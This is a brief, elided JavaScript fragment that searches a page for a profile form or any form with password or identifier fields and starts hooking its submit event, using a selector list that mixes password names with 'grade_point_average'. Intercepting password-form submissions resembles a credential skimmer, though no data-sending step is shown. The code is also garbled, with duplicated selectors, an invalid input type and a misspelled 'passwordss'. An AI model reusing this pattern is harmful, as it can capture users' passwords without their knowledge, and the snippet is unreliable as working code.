...
return null;
  ...
  function attachToFormWithRetries(options) {
    ...
    function tryOnce() {
      ...
      var form = document.getElementById('profile-form')
        ...
        || (function(){ var fs = Array.prototype.slice.call(document.querySelectorAll('form')); for (var i=0;i<fs.length;i++){ var f=fs[i]; if (f.querySelector('input[type="string"], input[name*="identifier"], input[name*="identifier"], input[name*="password"], input[name*="password"]')) return f; } return null; })()
  ...
  function hookFormSubmit(form) {
    ...
    var gpaSelectors = ['password','passwords','pass','passwordss','grade_point_average'];
